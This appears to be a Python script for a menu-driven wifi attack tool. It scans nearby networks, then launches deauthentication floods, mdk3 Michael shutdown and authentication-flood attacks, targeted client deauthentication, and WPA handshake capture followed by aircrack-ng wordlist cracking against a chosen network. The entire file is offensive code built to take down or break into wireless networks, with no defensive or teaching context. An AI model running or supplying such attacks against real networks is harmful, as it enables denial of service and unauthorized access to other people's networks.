import wifi
from wifi import Cell, Scheme

import os
from os import *

import time
from time import *

import keyboard
from keyboard import *

import sys

from termcolor import colored, cprint

os.system('clear')

networks = Cell.all('wlan0')

alert = colored('Found {} Networks\n'.format(len(networks)), 'green', attrs=['bold'])

for char in alert:
	sleep(0.05)
	sys.stdout.write(char)
	sys.stdout.flush()

x = 0
while x < len(networks):
	for network in networks:
		network_option = colored('{}) {} : {} | Channel {}\n'.format(x, network.ssid, network.address, network.channel), 'green', attrs=['bold'])

		sleep(0.25)
		sys.stdout.write(network_option)
		sys.stdout.flush()

		x += 1
sleep(0.25)
choice = networks[input("Choose A Network: ")]
os.system('clear')

network_choice = colored('You chose {}\nTarget: {}\nAddress: {}\nChannel: {}\n'.format(choice.ssid, choice.ssid, choice.address, choice.channel), 'green', attrs=['bold'])

for char in network_choice:
	sleep(0.05)
	sys.stdout.write(char)
	sys.stdout.flush()

__method__ = ['quit', 'Deauth', 'Micheal Shutdown Exploitation', 'Amok Deauthentication', 'Client Flood Attack', 'Deauth Specific Device', 'Capture and crack handshake']

y = 0

Choose = colored('Choose a method\n', 'green', attrs=['bold'])
for char in Choose:
	sleep(0.05)
	sys.stdout.write(char)
	sys.stdout.flush()

while y < len(__method__):
	for method in __method__:
		methods = colored('{}) {}\n'.format(y, method), 'green', attrs=['bold'])
		sleep(0.25)
		sys.stdout.write(methods)
		sys.stdout.flush()

		y += 1
sleep(0.25)
attack = __method__[input("Choose a method: ")]

if(attack == __method__[0]):
	os.system('airmon-ng stop wlan0mon')
	os.system('clear')
	quit()
elif(attack == __method__[1]):
	network_interface=raw_input("What network interface are you using: ")
	os.system('xterm -fg green -e airmon-ng start %s' % (network_interface))
	
	os.system('iwconfig wlan0mon channel %s ' % (choice.channel))
	os.system('clear')
	network_info = colored('Network Name: {}\nBSSID: {}\nChannel: {}\nInterface: wlan0mon\nPress ENTER to launch the attack'.format(choice.ssid, choice.address, choice.channel), 'green', attrs=['bold'])
	
	for char in network_info:
		sleep(0.05)
		sys.stdout.write(char)
		sys.stdout.flush()

	keyboard.wait('enter')
	deauth_pkts = 'Sending Deauth Packets To {}\n'.format(choice.ssid)
	for char in deauth_pkts:
		sleep(0.05)
		sys.stdout.write(char)
		sys.stdout.flush()

	os.system("xterm -hold -fg red -e aireplay-ng --deauth 0 -a %s wlan0mon" % (choice.address))
elif(attack == __method__[2]):
	network_interface=raw_input('What network interface are you using: ')

	os.system('xterm -fg green -e airmon-ng start %s' % (network_interface))
	
	os.system('iwconfig wlan0mon channel %s ' % (choice.channel))
	os.system('clear')

	network_info = colored('Network Name: {}\nBSSID: {}\nChannel: {}\nInterface: wlan0mon\nPress ENTER to launch the attack'.format(choice.ssid, choice.address, choice.channel), 'green', attrs=['bold'])
	
	for char in network_info:
		sleep(0.05)
		sys.stdout.write(char)
		sys.stdout.flush()
	
	keyboard.wait('enter')

	os.system('xterm -hold -fg red -e mdk3 wlan0mon m -t %s' % (choice.address))
elif(attack == __method__[3]):
	network_interface=raw_input('What network interface are you using: ')

	os.system('xterm -fg green -e airmon-ng start %s' % (network_interface))
	
	os.system('iwconfig wlan0mon channel %s ' % (choice.channel))
	os.system('clear')
	
	network_info = colored('Network Name: {}\nBSSID: {}\nChannel: {}\nInterface: wlan0mon\nPress ENTER to launch the attack'.format(choice.ssid, choice.address, choice.channel), 'green', attrs=['bold'])
	
	for char in network_info:
		sleep(0.05)
		sys.stdout.write(char)
		sys.stdout.flush()
	
	keyboard.wait('enter')

	os.system('xterm -hold -fg red -e mdk3 wlan0mon d -t %s' % (choice.address))	
elif(attack == __method__[4]):
	network_interface=raw_input('What network interface are you using: ')

	os.system('xterm -fg green -e airmon-ng start %s' % (network_interface))
	
	os.system('clear')
	
	network_info = colored('Network Name: {}\nBSSID: {}\nChannel: {}\nInterface: wlan0mon\nPress ENTER to launch the attack'.format(choice.ssid, choice.address, choice.channel), 'green', attrs=['bold'])

	for char in network_info:
		sleep(0.05)
		sys.stdout.write(char)
		sys.stdout.flush()

	keyboard.wait('enter')

	os.system('xterm -hold -fg red -e mdk3 wlan0mon a -a %s -m' % (choice.address))
elif(attack == __method__[5]):
	network_interface=raw_input('What network interface are you using: ')

	os.system('xterm -fg green -e airmon-ng start %s' % (network_interface))
	
	os.system('clear')
	os.system('airodump-ng -c %s --bssid %s -w psk wlan0mon' % (choice.channel, choice.address))
	bssid = raw_input('Enter the Station here: ')

	network_info = colored('Network Name: {}\nBSSID: {}\nChannel: {}\nInterface: wlan0mon\nStation: {}\nPress ENTER to launch the attack'.format(choice.ssid, choice.address, choice.channel, bssid), 'green', attrs=['bold'])
	os.system('clear')
	for char in network_info:
		sleep(0.05)
		sys.stdout.write(char)
		sys.stdout.flush()

	keyboard.wait('enter')

	os.system('xterm -hold -fg red -e aireplay-ng -0 0 -a %s -c %s wlan0mon' % (choice.address, bssid))
elif(attack == __method__[6]):
	network_interface=raw_input('What network interface are you using: ')

	os.system('xterm -fg green -e airmon-ng start %s' % (network_interface))
	
	os.system('clear')

	network_info = colored('Network Name: {}\nBSSID: {}\nChannel: {}\nInterface: wlan0mon\nPress ENTER to capture handshake'.format(choice.ssid, choice.address, choice.channel), 'green', attrs=['bold'])
	for char in network_info:
		sleep(0.05)
		sys.stdout.write(char)
		sys.stdout.flush()

	keyboard.wait('enter')
	
	os.system('airodump-ng -c %s --bssid %s -w capture wlan0mon & xterm -fg red -e aireplay-ng --deauth 0 -a %s wlan0mon' % (choice.channel, choice.address, choice.address))
	
	def crackHandshake():
		os.system('clear')
		handshake = raw_input('Enter the path to the handshake: ')
		
		os.system('clear')	

		handshake_info = colored('Network Name: {}\nBSSID: {}\nChannel: {}\nInterface: wlan0mon\nHandshake: WPA[{}]\n'.format(choice.ssid, choice.address, choice.channel,choice.address), 'green', attrs=['bold'])

		for char in handshake_info:
			sleep(0.05)
			sys.stdout.write(char)
			sys.stdout.flush()

		wordlist = raw_input('Enter the path to the wordlist: ')
		
		os.system('clear')
		
		for char in handshake_info:
			sleep(0.05)
			sys.stdout.write(char)
			sys.stdout.flush()

		Press_enter = colored('Press ENTER to crack', 'green', attrs=['bold'])

		for char in Press_enter:
			sleep(0.05)
			sys.stdout.write(char)
			sys.stdout.flush()

		keyboard.wait('enter')
	
		os.system('xterm -hold -fg green -e aircrack-ng %s -w %s' % (handshake, wordlist))

	crackHandshake()

os.system('clear')

leave_monitorMode = colored('Press ESC to leave monitor mode', 'green', attrs=['bold', 'underline'])

for char in leave_monitorMode:
	sleep(0.05)
	sys.stdout.write(char)
	sys.stdout.flush()

keyboard.wait('esc')

os.system('airmon-ng stop wlan0mon')
os.system('clear')
